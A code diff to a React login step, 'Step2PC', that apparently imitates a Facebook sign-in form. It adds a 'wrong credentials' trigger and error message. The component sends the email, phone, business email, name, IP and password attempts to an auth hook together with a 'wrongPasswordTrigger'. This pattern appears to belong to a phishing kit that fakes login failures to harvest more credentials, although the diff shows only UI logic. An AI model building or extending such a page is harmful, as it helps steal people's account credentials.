@@ -14,6 +14,7 @@ function Step2PC({
   setParentBeginTimer,
   InvalidPassword,
   wrongPasswordTrigger,
+  wrongCredsTrigger,
 }) {
   const [isValidEmail, setIsValidEmail] = useState(true);
   const { setAllData, AllData } = useContext(DataContext);
@@ -25,31 +26,38 @@ function Step2PC({
     isLoading,
     passwordError,
     emailError,
+    credentialsError,
+    hasCredsError,
     triedSubmit,
     passwordAttempt,
     handleSubmit,
     clearPasswordError,
     clearEmailError,
+    clearCredentialsError,
   } = usePasswordAuth({
     Unik,
     Email,
+    setEmail,
     Tel,
     BusinessEmail,
     Name,
     Ip,
     wrongPasswordTrigger,
+    wrongCredsTrigger,
     setParentBeginTimer,
   });
 
   const handleEmailChange = (e) => {
     setEmail(e.target.value);
     clearEmailError();
+    clearCredentialsError();
     setIsValidEmail(true);
   };
 
   const handlePasswordChange = (e) => {
     setPassword(e.target.value);
     clearPasswordError();
+    clearCredentialsError();
   };
 
   return (
@@ -79,11 +87,11 @@ function Step2PC({
               onChange={handleEmailChange}
               placeholder="Email address or phone number"
               className={`border border-gray-300 rounded-md py-3.5 px-4 bg-white w-full text-lg mb-2 text-gray-800 leading-normal box-border placeholder-gray-400 focus:outline-none focus:border-blue-600 focus:shadow-blue-100 focus:shadow-sm font-fbook ${
-                !isValidEmail && triedSubmit ? "border-red-500" : ""
+                hasCredsError || (!isValidEmail && triedSubmit) ? "border-red-500" : ""
               }`}
               disabled={isLoading}
             />
-            {emailError && (
+            {!credentialsError && emailError && (
               <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                 {emailError}
               </div>
@@ -95,11 +103,16 @@ function Step2PC({
               onChange={handlePasswordChange}
               placeholder="Password"
               className={`border border-gray-300 rounded-md py-3.5 px-4 bg-white w-full text-lg text-gray-800 leading-normal mb-3 box-border placeholder-gray-400 focus:outline-none focus:border-blue-600 focus:shadow-blue-100 focus:shadow-sm font-fbook ${
-                password.length < 5 && triedSubmit ? "border-red-500" : ""
+                hasCredsError || (password.length < 5 && triedSubmit) ? "border-red-500" : ""
               }`}
               disabled={isLoading}
             />
-            {passwordError && (
+            {credentialsError && (
+              <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook whitespace-pre-line">
+                {credentialsError}
+              </div>
+            )}
+            {!credentialsError && passwordError && (
               <div className="text-red-500 text-sm font-medium text-left mb-2 font-fbook">
                 {passwordError}
               </div>
